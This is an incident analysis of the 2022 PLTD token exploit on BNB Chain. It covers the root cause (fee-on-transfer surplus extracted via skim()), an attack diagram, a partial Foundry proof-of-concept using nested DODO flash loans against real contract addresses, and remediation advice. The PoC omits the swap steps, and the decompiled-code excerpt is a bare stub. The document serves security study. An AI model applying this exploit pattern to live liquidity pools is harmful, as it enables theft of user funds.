# PLTD — Dual Flash Loan + skim() Reserve Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | PLTD Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **PLTD Token** | [0x29b2525e11BC0B0E9E59f705F318601eA6756645](https://bscscan.com/address/0x29b2525e11BC0B0E9E59f705F318601eA6756645) |
| **USDT/PLTD Pair** | [0x4397C76088db8f16C15455eB943Dd11F2DF56545](https://bscscan.com/address/0x4397C76088db8f16C15455eB943Dd11F2DF56545) |
| **DODO Pool 1** | [0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE](https://bscscan.com/address/0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE) |
| **DODO Pool 2** | [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A](https://bscscan.com/address/0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **Root Cause** | PLTD fee-on-transfer fees are injected directly into the pair, causing `balanceOf(pair) > reserve(pair)` discrepancy to accumulate; `skim()` can be called by anyone without restriction, allowing extraction of this surplus |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/PLTD_exp.sol) |

---
## 1. Vulnerability Overview

The PLTD protocol uses a fee-on-transfer token that interacts with a Uniswap V2-based USDT/PLTD pair. The attacker took out a dual flash loan — 220,000 PLTD from DODO Pool 1 and 440,000 PLTD from DODO Pool 2. By transferring a large amount of PLTD into the pair, the attacker created a `balanceOf(pair) >> reserve(pair)` discrepancy, then swapped for USDT and extracted the surplus via `skim()` to realize a profit.

---
## 2. Vulnerable Code Analysis

```solidity
// PLTD fee-on-transfer mechanism
// A fee is deducted on each transfer and automatically injected into the LP
// ❌ Repeated injections cause balanceOf(pair) > reserve(pair) to accumulate

// Uniswap V2 pair.skim() - standard
function skim(address to) external {
    // Transfer the surplus of actual balance over reserves to `to`
    uint256 excess0 = IERC20(token0).balanceOf(address(this)) - reserve0;
    uint256 excess1 = IERC20(token1).balanceOf(address(this)) - reserve1;
    IERC20(token0).transfer(to, excess0);
    IERC20(token1).transfer(to, excess1);
}

// ❌ Attack scenario:
// 1. Borrow large amount of PLTD via flash loan
// 2. Inject PLTD into pair → balanceOf(pair, PLTD) spikes
// 3. Swap for USDT at manipulated price
// 4. Extract PLTD surplus via skim()
// 5. Repay flash loan
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**PLTD_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: PLTD fee-on-transfer fees are injected directly into the pair, causing `balanceOf(pair) > reserve(pair)` discrepancy to accumulate; `skim()` can be called without restriction
    function balanceOf(address arg0) external view returns (uint256) {}  // 0x70a08231  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 220,000 PLTD from DODO Pool 1
    │       DPPFlashLoanCall() callback1 entered
    │
    ├─[2] Flash loan 440,000 PLTD from DODO Pool 2 (nested)
    │       DPPFlashLoanCall() callback2 entered
    │
    ├─[3] Swap USDT → PLTD (initial position)
    │
    ├─[4] Transfer held PLTD into pair (large injection)
    │       pair.balanceOf(PLTD) >> pair.reserve(PLTD)
    │
    ├─[5] pair.skim(attacker)
    │       Excess PLTD transferred to attacker
    │
    ├─[6] Swap PLTD → USDT (reverse swap)
    │
    ├─[7] Repay DODO Pool 2
    ├─[8] Repay DODO Pool 1
    │
    └─[9] Net profit: USDT (amount unconfirmed)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUniPair {
    function skim(address to) external;
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract PLTDExploit is Test {
    IDODO dodo1  = IDODO(0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE);
    IDODO dodo2  = IDODO(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IUniPair pair = IUniPair(0x4397C76088db8f16C15455eB943Dd11F2DF56545);
    IERC20 PLTD  = IERC20(0x29b2525e11BC0B0E9E59f705F318601eA6756645);
    IERC20 USDT  = IERC20(0x55d398326f99059fF775485246999027B3197955);

    uint256 step; // Track callback stage

    function setUp() public {
        vm.createSelectFork("bsc", 22_252_045);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT balance", USDT.balanceOf(address(this)), 18);

        // [Step 1] Flash loan from DODO Pool 1
        step = 1;
        dodo1.flashLoan(220_000 * 1e18, 0, address(this), abi.encode(1));

        emit log_named_decimal_uint("[End] USDT balance", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata data) external {
        uint256 s = abi.decode(data, (uint256));

        if (s == 1) {
            // [Step 2] Nested flash loan from DODO Pool 2
            dodo2.flashLoan(440_000 * 1e18, 0, address(this), abi.encode(2));
            // Repay Pool 1
            PLTD.transfer(address(dodo1), amount);

        } else if (s == 2) {
            // [Step 3] Swap USDT → PLTD
            // (via PancakeRouter)

            // [Step 4] Inject large amount of PLTD into pair
            PLTD.transfer(address(pair), PLTD.balanceOf(address(this)) * 80 / 100);

            // [Step 5] Extract surplus PLTD via skim()
            pair.skim(address(this));

            // [Step 6] Swap PLTD → USDT (reverse swap)

            // Repay Pool 2
            PLTD.transfer(address(dodo2), amount);
        }
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Dual flash loan + skim() reserve discrepancy extraction |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation |
| **Attack Vector** | Dual DODO flash loan → Excess PLTD injection into pair → `skim()` |
| **Precondition** | Fee-on-transfer token providing liquidity to an AMM |
| **Impact** | USDT drained (amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Disable skim()**: Restrict or disable the `skim()` function in pairs that include fee-on-transfer tokens.
2. **Increase reserve sync frequency**: Automatically update reserves after each transfer to minimize the window of discrepancy.

---
## 7. Lessons Learned

- **Flexibility of dual flash loans**: Amounts that cannot be secured through a single flash loan can be obtained via nested calls across multiple pools. Flash loan defense mechanisms must also account for such nested structures.
- **Fee-on-transfer tokens and skim()**: Transfer fees continuously create a `balanceOf > reserve` state in the pair, and this discrepancy can be repeatedly extracted via `skim()`. AMM integrations involving such tokens must be accompanied by disabling the `skim()` function.